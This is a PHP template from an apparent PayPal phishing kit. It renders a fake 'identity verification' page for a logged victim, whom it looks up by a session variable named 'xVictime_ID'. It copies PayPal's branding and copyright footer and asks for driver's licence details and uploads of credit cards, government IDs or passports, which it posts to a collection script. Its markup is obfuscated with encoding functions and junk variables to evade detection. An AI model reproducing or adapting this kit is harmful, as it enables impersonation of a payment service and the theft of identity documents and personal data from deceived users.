<?php
// Decoded by Girudatsu.com Member

$T_cYZREBN = 'date';
$p_WqUxED_LaP = 'date';
include 'inc/crypt.php';
echo '<!' . xCrypt(83 - -17, 546 + -46) . '>';
?>
<!-- <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/identity.min.js');
?>
"></script> -->
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/identity.js');
?>
"></script>
<style>
	body{ background-color: #f8f8f8; }
</style>
<?php
echo '<!' . xCrypt(146 + -46, 692 - 192) . '>';
$T_cYZREBN = 'date';
$p_WqUxED_LaP = 'date';
@session_start();
$pdo = new PDO('sqlite:admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    $_tl = $settings['truelogin'] == 'Yes' ? (bool) (13 + -12) : (bool) (42 + -42);
    $account = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    $fullname = $account['fullname'];
    $profilephoto = $account['profilephoto'];
    $joined = $account['joined'];
    $account_type = $account['account_type'];
    $address = $account['address'];
    include_once 'inc/language.php';
}
echo '<!' . xCrypt(128 - 28, 353 + 147) . '>';
$T_cYZREBN = 'date';
$p_WqUxED_LaP = 'date';
if ($_tl) {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="Yes">
<?php
    $T_cYZREBN = 'date';
    $p_WqUxED_LaP = 'date';
} else {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="No">
<?php
    $T_cYZREBN = 'date';
    $p_WqUxED_LaP = 'date';
}
?>
<div id="<?php
echo xTextEncode('header_update');
?>
">
	<div class="<?php
echo xCrypt(84 + -74, 57 + -7);
?>
 <?php
echo xTextEncode('container_update for_nav');
?>
">
		<div id="<?php
echo xTextEncode('menu_btn_update');
?>
"></div>
		<div id="<?php
echo xTextEncode('logo_update');
?>
"></div>
		<ul class="<?php
echo xCrypt(3 - -7, 35 + 15);
?>
 <?php
echo xTextEncode('nav');
?>
">
			<li class="<?php
echo xCrypt(79 + -69, 62 - 12);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(1 - -9, 81 + -31);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(84 + -74, 60 - 10);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(53 + -43, -14 - -64);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-35 - -45, -36 - -86);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(109 + -99, 6 - -44);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(78 + -68, 41 + 9);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(3 + 7, 30 - -20);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['navbar']['4'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(47 + -37, 147 + -97);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-39 - -49, 21 + 29);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['navbar']['5'];
?>
</a>
			</li>
		</ul>
<?php
echo '<!' . xCrypt(85 - -15, 65 + 435) . '>';
?>
		<div id="<?php
echo xTextEncode('logout');
?>
">
			<div class="<?php
echo xCrypt(47 + -37, 108 + -58);
?>
 <?php
echo xTextEncode('sub_logout');
?>
">
				<button class="<?php
echo xCrypt(-58 - -68, 121 + -71);
?>
 <?php
echo xTextEncode('log_out');
?>
"><?php
echo $language['identity']['navbar']['6'];
?>
</button>
			</div>
			<div class="<?php
echo xCrypt(12 + -2, -40 - -90);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('setting');
?>
">
			</div>
			<div class="<?php
echo xCrypt(19 - 9, 90 + -40);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('alert');
?>
">
			</div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(90 - -10, 480 - -20) . '>';
?>
<div id="<?php
echo xTextEncode('sub_menu');
?>
">
	<div class="<?php
echo xCrypt(-85 - -95, -36 - -86);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<ul class="<?php
echo xCrypt(-84 - -94, 33 + 17);
?>
 <?php
echo xTextEncode('sub_nav');
?>
">
			<li class="<?php
echo xCrypt(-1 - -11, 94 - 44);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(33 + -23, 37 + 13);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['sub_navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-31 - -41, 34 + 16);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(-61 - -71, 82 + -32);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['sub_navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(83 + -73, 29 - -21);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(-48 - -58, 45 + 5);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['sub_navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(54 + -44, 77 - 27);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(-57 - -67, 95 + -45);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['identity']['sub_navbar']['4'];
?>
</a>
			</li>
		</ul>
		<div class="<?php
echo xCrypt(15 - 5, 15 + 35);
?>
 <?php
echo xTextEncode('arrow');
?>
"></div>
	</div>
</div>
<?php
echo '<!' . xCrypt(50 + 50, 686 - 186) . '>';
?>
<div id="<?php
echo xTextEncode('update_content');
?>
">
	<div class="<?php
echo xCrypt(-25 - -35, 37 - -13);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(-31 - -41, 83 - 33);
?>
 <?php
echo xTextEncode('row first');
?>
">
			<div class="<?php
echo xCrypt(60 + -50, -46 - -96);
?>
 <?php
echo xTextEncode('six columns');
?>
">
				<div class="<?php
echo xCrypt(32 + -22, 8 - -42);
?>
 <?php
echo xTextEncode('row');
?>
" <?php
echo $display_profile;
?>
>
					<div id="<?php
echo xTextEncode('profile_div');
?>
">
						<font class="<?php
echo xCrypt(0 - -10, 76 + -26);
?>
 <?php
echo xTextEncode('profile');
?>
"><?php
echo $language['identity']['1'];
?>
</font>
						<div id="<?php
echo xTextEncode('profile_img');
?>
" style="background-image:url(<?php
echo $profilephoto;
?>
);"></div>
						<div id="<?php
echo xTextEncode('Update_Photo');
?>
"><?php
echo $language['identity']['2'];
?>
</div>
					</div>
					<div id="<?php
echo xTextEncode('profile_name_div');
?>
">
						<div id="<?php
echo xTextEncode('my_name');
?>
"><?php
echo $fullname;
?>
</div>
						<div id="<?php
echo xTextEncode('joined_at');
?>
"><?php
echo $language['identity']['3'];
?>
 <?php
echo $joined;
?>
 <font><?php
echo $language['identity']['4'];
?>
</font></div>
					</div>
				</div>
<?php
echo '<!' . xCrypt(97 + 3, 668 - 168) . '>';
?>
				<div id="<?php
echo xTextEncode('frm_account');
?>
">
					<table>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_checked.png');
?>
"></td><td><?php
echo $language['identity']['5']['1'];
?>
</td></tr>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_checked.png');
?>
"></td><td><?php
echo $language['identity']['5']['2'];
?>
</td></tr>
						<?php
$T_cYZREBN = 'date';
$p_WqUxED_LaP = 'date';
if ($settings['enable_bank'] == 'yes') {
    ?>
							<tr><td width="30px"><img src="<?php
    echo xTextEncode('img/icon_checked.png');
    ?>
"></td><td><?php
    echo $language['identity']['5']['3'];
    ?>
</td></tr>
						<?php
    $T_cYZREBN = 'date';
    $p_WqUxED_LaP = 'date';
}
?>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_uncheck.png');
?>
"></td><td><?php
echo $language['identity']['5']['4'];
?>
</td></tr>
					</table>
				</div>
			</div>
<?php
echo '<!' . xCrypt(5 + 95, 838 - 338) . '>';
?>
			<div class="<?php
echo xCrypt(-62 - -72, 66 + -16);
?>
 <?php
echo xTextEncode('six columns');
?>
">
			<form action="inc/id.php" method="post" enctype="<?php
echo xTextEncode('multipart/form-data');
?>
">
				<div class="<?php
echo xCrypt(86 + -76, 78 - 28);
?>
 <?php
echo xTextEncode('profile');
?>
" id="<?php
echo xTextEncode('big_title');
?>
"><?php
echo $language['identity']['6'];
?>
</div>
				<div id="<?php
echo xTextEncode('address_div');
?>
">

				<div id="<?php
echo xTextEncode('step_identity');
?>
">
					<div id="<?php
echo xTextEncode('for_drive');
?>
">
						<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('driver_number');
?>
" id="<?php
echo xTextEncode('driver_number');
?>
" value="" placeholder="Drive ID Number" class="<?php
echo xCrypt(89 + -79, 80 + -30);
?>
 <?php
echo xTextEncode('u-full-width');
?>
">
						<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('driver_issued_by');
?>
" id="<?php
echo xTextEncode('driver_issued_by');
?>
" value="" placeholder="Issued By" class="<?php
echo xCrypt(70 + -60, 91 + -41);
?>
 <?php
echo xTextEncode('u-pull-left');
?>
" style="width:49%;">
						<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('driver_expire_date');
?>
" id="<?php
echo xTextEncode('driver_expire_date');
?>
" value="" placeholder="Expire Date (MM/YYYY)" class="<?php
echo xCrypt(76 + -66, 10 + 40);
?>
 <?php
echo xTextEncode('u-pull-right');
?>
" style="width:49%;">
					</div>
<?php
echo '<!' . xCrypt(101 - 1, 553 - 53) . '>';
?>
					<select name="<?php
echo xTextEncode('identity_type');
?>
" id="<?php
echo xTextEncode('identity_type');
?>
" class="<?php
echo xCrypt(-90 - -100, 73 + -23);
?>
 <?php
echo xTextEncode('u-full-width');
?>
">
						<option value="0">Document Type?</option>
						<option value="Credit Card">• Credit Card</option>
						<option value="Government ID">• Government ID</option>
						<option value="Drive ID">• Drive ID</option>
						<option value="Passport">• Passport</option>
					</select>
<?php
echo '<!' . xCrypt(46 - -54, 808 - 308) . '>';
?>
					<div id="<?php
echo xTextEncode('drag_drop');
?>
">
						<div id="<?php
echo xTextEncode('drag_drop_dashed');
?>
">
							<div id="<?php
echo xTextEncode('dragdroptohide');
?>
"><?php
echo $language['identity']['7'];
?>
</div>
						</div>
					</div>
				</div>

					<input type="<?php
echo xTextEncode('file');
?>
" name="<?php
echo xTextEncode('file[]');
?>
" id="<?php
echo xTextEncode('file');
?>
" value="" placeholder="" multiple>
					<input type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('identity_btn_submit');
?>
" id="<?php
echo xTextEncode('identity_btn_submit');
?>
" value="Upload" class="<?php
echo xCrypt(72 + -62, 65 + -15);
?>
 <?php
echo xTextEncode('u-full-width button-primary');
?>
">
					<button type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('i_dont_have_my_id_now');
?>
" id="<?php
echo xTextEncode('i_dont_have_my_id_now');
?>
" class="<?php
echo xCrypt(36 + -26, 11 - -39);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"><?php
echo $language['identity']['8'];
?>
</button>
				</div>
			</form>
			</div>
		</div>
<?php
echo '<!' . xCrypt(8 + 92, 444 - -56) . '>';
?>
		<div id="<?php
echo xTextEncode('footer_update_mobile');
?>
">
			<div class="<?php
echo xCrypt(-59 - -69, 28 - -22);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(75 + -65, 93 - 43);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font></div>
			<div class="<?php
echo xCrypt(9 - -1, -18 - -68);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(29 + -19, 143 + -93);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal, Inc. All rights reserved.');
?>
</font></div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(193 + -93, 844 - 344) . '>';
?>
<div id="<?php
echo xTextEncode('footer_update');
?>
">
	<div class="<?php
echo xCrypt(83 + -73, -47 - -97);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(-60 - -70, 142 + -92);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(-28 - -38, 5 + 45);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font><img src="<?php
echo xTextEncode('img/feedback.png');
?>
"></div>
		<div class="<?php
echo xCrypt(-59 - -69, 15 - -35);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(41 + -31, 11 - -39);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal, Inc. All rights reserved.');
?>
</font> <font class="<?php
echo xCrypt(88 + -78, 116 + -66);
?>
 <?php
echo xTextEncode('footer3');
?>
">|</font> <font class="<?php
echo xCrypt(51 + -41, 139 + -89);
?>
 <?php
echo xTextEncode('footer4');
?>
">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font></div>
	</div>
</div>
